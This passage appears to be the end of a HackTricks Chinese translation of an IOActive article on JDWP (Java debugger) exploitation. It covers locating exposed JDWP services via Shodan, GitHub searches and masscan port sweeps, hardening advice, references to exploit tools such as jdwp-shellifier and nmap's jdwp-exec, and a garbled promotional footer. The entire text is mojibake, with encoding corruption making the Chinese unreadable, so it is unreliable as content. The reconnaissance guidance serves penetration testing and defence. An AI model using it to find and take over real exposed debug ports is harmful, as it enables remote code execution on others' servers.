### **ç°å®ç”Ÿæ´»ä¸­çš„åˆ©ç”¨æƒ…å†µå¦‚ä½•ï¼Ÿ**

äº‹å®ä¸Šï¼ŒJDWPåœ¨Javaåº”ç”¨ç¨‹åºä¸–ç•Œä¸­è¢«å¹¿æ³›ä½¿ç”¨ã€‚ç„¶è€Œï¼Œåœ¨è¿›è¡Œè¿œç¨‹è¯„ä¼°æ—¶ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯èƒ½ä¸ç»å¸¸é‡åˆ°å®ƒï¼Œå› ä¸ºé˜²ç«å¢™é€šå¸¸ä¼šé˜»æ­¢å®ƒè¿è¡Œçš„ç«¯å£ã€‚ä½†è¿™å¹¶ä¸æ„å‘³ç€JDWPåœ¨é‡å¤–æ‰¾ä¸åˆ°ï¼š

* åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œå¿«é€Ÿåœ¨ShodanHQ\[4]ä¸Šæœç´¢ç«‹å³æ˜¾ç¤ºå¤§çº¦æœ‰40ä¸ªæœåŠ¡å™¨å‘é€JDWPæ¡æ‰‹ï¼š

![](https://ioactive.com/wp-content/uploads/2014/04/shodan.png)

è¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªæœ‰è¶£çš„å‘ç°ï¼Œå› ä¸ºæ­£å¦‚æˆ‘ä»¬ä¹‹å‰æ‰€è§ï¼Œåº”è¯¥æ˜¯å®¢æˆ·ç«¯ï¼ˆè°ƒè¯•å™¨ï¼‰å‘èµ·å¯¹è¯ã€‚

* GitHub\[7]ä¹Ÿæ˜¾ç¤ºäº†å¤§é‡æ½œåœ¨æ˜“å—æ”»å‡»çš„å¼€æºåº”ç”¨ç¨‹åºï¼š

![](https://ioactive.com/wp-content/uploads/2014/04/github.png)

* å¯¹äº’è”ç½‘è¿›è¡Œç‰¹å®šç«¯å£ï¼ˆtcp/8000ã€tcp/8080ã€tcp/8787ã€tcp/5005ï¼‰çš„masscanæ‰«æï¼Œå‘ç°è®¸å¤šä¸»æœºï¼ˆæ— æ³•åœ¨æ­¤æŠ¥å‘Šï¼‰å“åº”äº†åˆå§‹æ¡æ‰‹ã€‚
* åœ¨é‡å¤–å‘ç°äº†ä¸€äº›â€œä¼ä¸šâ€åº”ç”¨ç¨‹åºé»˜è®¤è¿è¡ŒJDWPæœåŠ¡ï¼ˆæŸ¥æ‰¾å®é™…ç«¯å£å·ç•™ç»™å¥½å¥‡çš„è¯»è€…ä½œä¸ºç»ƒä¹ ï¼‰ã€‚

è¿™åªæ˜¯å‘ç°äº’è”ç½‘ä¸Šå¼€æ”¾çš„JDWPæœåŠ¡çš„å‡ ç§æ–¹æ³•ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æé†’ï¼Œåº”ç”¨ç¨‹åºåº”å®šæœŸè¿›è¡Œå½»åº•çš„å®‰å…¨å®¡æŸ¥ï¼Œç”Ÿäº§ç¯å¢ƒåº”å…³é—­ä»»ä½•è°ƒè¯•åŠŸèƒ½ï¼Œå¹¶é…ç½®é˜²ç«å¢™ä»…é™åˆ¶å¯¹æ­£å¸¸æ“ä½œæ‰€éœ€çš„æœåŠ¡çš„è®¿é—®ã€‚å…è®¸ä»»ä½•äººè¿æ¥åˆ°JDWPæœåŠ¡ä¸å…è®¸è¿æ¥åˆ°gdbserveræœåŠ¡å®Œå…¨ç›¸åŒï¼ˆå¯èƒ½æ›´ç¨³å®šï¼‰ã€‚å¸Œæœ›æ‚¨å–œæ¬¢é˜…è¯»æœ¬æ–‡ï¼Œå°±åƒæˆ‘å–œæ¬¢ç©JDWPä¸€æ ·ã€‚ç¥æ‰€æœ‰å¼ºå¤§çš„æµ·ç›—ä»¬ï¼Œå¿«ä¹çš„JDWPæ§åˆ¶ï¼ï¼

**æ„Ÿè°¢**\
\
æˆ‘è¦æ„Ÿè°¢Ilja Van Sprundelå’ŒSebastien Mackeçš„æƒ³æ³•å’Œæµ‹è¯•ã€‚

### **å‚è€ƒèµ„æ–™ï¼š**

1. [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
2. [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
3. http://www.secdev.org/projects/scapyï¼ˆä¸å†æ´»è·ƒï¼‰
4. [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
5. http://www.hsc-news.com/archives/2013/000109.htmlï¼ˆä¸å†æ´»è·ƒï¼‰
6. [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
7. https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
8. [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
9. [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
10. [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
11. [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**ä¸ºä½ çš„å…¬å¸åšå¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
